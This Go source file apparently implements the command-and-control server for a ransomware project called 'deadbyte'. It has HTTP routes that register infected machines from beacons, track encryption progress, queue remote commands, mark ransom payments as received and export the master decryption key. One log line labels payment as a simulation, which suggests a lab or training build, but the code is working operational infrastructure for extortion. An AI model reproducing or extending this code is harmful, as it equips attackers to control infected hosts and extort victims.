package main

import (
	"crypto/rand"
	"embed"
	"encoding/hex"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"path/filepath"
	"strings"

	"deadbyte/internal/crypto"
	"deadbyte/internal/types"
)

//go:embed web/index.html
var panelFS embed.FS

func (s *server) routes() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /{$}", s.handlePanel)
	mux.HandleFunc("POST /api/v1/beacon", s.handleBeacon)
	mux.HandleFunc("POST /api/v1/heartbeat", s.handleHeartbeat)
	mux.HandleFunc("GET /api/v1/infections", s.handleListInfections)
	mux.HandleFunc("GET /api/v1/infections/{id}", s.handleGetInfection)
	mux.HandleFunc("GET /api/v1/events", s.handleEvents)
	mux.HandleFunc("POST /api/v1/infections/{id}/paid", s.handleMarkPaid)
	mux.HandleFunc("POST /api/v1/infections/{id}/command", s.handleCommand)
	mux.HandleFunc("POST /api/v1/key/export", s.handleExportKey)
	mux.HandleFunc("GET /api/v1/key/public", s.handlePublicKey)
	mux.HandleFunc("GET /artifacts/{name}", s.handleArtifact)
	return s.logMiddleware(mux)
}

func (s *server) logMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if s.verbose {
			log.Printf("%s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
		}
		next.ServeHTTP(w, r)
	})
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func readJSON(r *http.Request, v any) error {
	return json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(v)
}

func (s *server) requireBeaconToken(r *http.Request) bool {
	return s.beacon == "" || r.Header.Get(types.HeaderToken) == s.beacon
}

func (s *server) requireAdmin(r *http.Request) bool {
	auth := r.Header.Get("Authorization")
	return s.admin != "" && strings.TrimPrefix(auth, "Bearer ") == s.admin
}

func newInfectionID() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "DBYTE-UNKNOWN"
	}
	return "DBYTE-" + strings.ToUpper(hex.EncodeToString(b))
}

func (s *server) handlePanel(w http.ResponseWriter, r *http.Request) {
	b, err := panelFS.ReadFile("web/index.html")
	if err != nil {
		http.Error(w, "panel not found", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(b)
}

func (s *server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if !s.requireBeaconToken(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "bad token"})
		return
	}
	var req types.BeaconReq
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "bad request"})
		return
	}
	id := req.ID
	if id == "" {
		id = newInfectionID()
	}
	inf, err := s.st.GetInfection(id)
	if err != nil || inf == nil {
		inf = &types.Infection{ID: id, FirstSeen: types.Now()}
		s.st.AddEvent(types.Event{At: types.Now(), InfID: id, Level: "info", Msg: "new infection registered (initial beacon)"})
	}
	inf.Hostname = req.Hostname
	inf.Username = req.Username
	inf.OS = req.OS
	inf.Arch = req.Arch
	inf.PID = req.PID
	inf.Version = req.Version
	inf.Interfaces = req.Interfaces
	inf.LastSeen = types.Now()
	if inf.Phase == "" {
		inf.Phase = "registered"
	}
	if err := s.st.UpsertInfection(inf); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, types.BeaconResp{ID: id, Interval: s.beaconInterval})
}

func (s *server) handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	if !s.requireBeaconToken(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "bad token"})
		return
	}
	var req types.HeartbeatReq
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "bad request"})
		return
	}
	inf, err := s.st.GetInfection(req.ID)
	if err != nil || inf == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "unknown infection"})
		return
	}
	if req.Phase != inf.Phase {
		s.st.AddEvent(types.Event{At: types.Now(), InfID: inf.ID, Level: "info", Msg: "fase: " + req.Phase})
	}
	inf.Phase = req.Phase
	inf.Files = req.Files
	inf.Bytes = req.Bytes
	inf.Errors = req.Errors
	inf.LastSeen = types.Now()
	if req.Note != "" {
		inf.Note = req.Note
	}
	_ = s.st.UpsertInfection(inf)
	cmds, err := s.st.DrainCommands(inf.ID)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, types.HeartbeatResp{Commands: cmds})
}

func (s *server) handleListInfections(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	list, err := s.st.ListInfections()
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"infections": list})
}

func (s *server) handleGetInfection(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	inf, err := s.st.GetInfection(r.PathValue("id"))
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}
	events, _ := s.st.ListEvents(inf.ID, 100)
	writeJSON(w, http.StatusOK, map[string]any{"infection": inf, "events": events})
}

func (s *server) handleEvents(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	events, _ := s.st.ListEvents("", 300)
	writeJSON(w, http.StatusOK, map[string]any{"events": events})
}

func (s *server) handleMarkPaid(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	id := r.PathValue("id")
	inf, err := s.st.GetInfection(id)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}
	inf.Paid = true
	_ = s.st.UpsertInfection(inf)
	s.st.AddEvent(types.Event{At: types.Now(), InfID: id, Level: "success", Msg: "payment marked as received (simulation)"})
	writeJSON(w, http.StatusOK, inf)
}

func (s *server) handleCommand(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	id := r.PathValue("id")
	var req struct {
		Type  string `json:"type"`
		Value string `json:"value"`
	}
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "bad request"})
		return
	}
	if req.Type == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "type required"})
		return
	}
	cmd := types.Command{ID: newInfectionID() + "-" + req.Type, Type: req.Type, Value: req.Value, At: types.Now()}
	if err := s.st.AddCommand(id, cmd); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	s.st.AddEvent(types.Event{At: types.Now(), InfID: id, Level: "info", Msg: "command queued: " + req.Type})
	writeJSON(w, http.StatusOK, cmd)
}

func (s *server) handleExportKey(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	sealed := r.Header.Get("X-Master-Secret")
	if sealed == "" {
		sealed = s.masterSecret
	}
	blob, err := s.st.GetMeta("master_priv_sealed")
	if err != nil || blob == "" {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "no master key stored"})
		return
	}
	priv, err := crypto.OpenMasterKey([]byte(blob), sealed)
	if err != nil {
		writeJSON(w, http.StatusForbidden, map[string]string{"error": "cannot unlock master key: " + err.Error()})
		return
	}
	privKey, err := crypto.PrivFromBytes(priv)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	pub, _ := s.st.GetMeta("master_pub_b64")
	writeJSON(w, http.StatusOK, map[string]string{
		"private_key": crypto.PrivToB64(privKey),
		"public_key":  pub,
	})
}

func (s *server) handlePublicKey(w http.ResponseWriter, r *http.Request) {
	pub, err := s.st.GetMeta("master_pub_b64")
	if err != nil || pub == "" {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "no master key stored"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"public_key": pub})
}

func (s *server) handleArtifact(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdmin(r) {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "admin token required"})
		return
	}
	name := filepath.Base(r.PathValue("name"))
	if name == "." || name == "/" {
		http.NotFound(w, r)
		return
	}
	p := filepath.Join(s.dist, name)
	http.ServeFile(w, r, p)
}
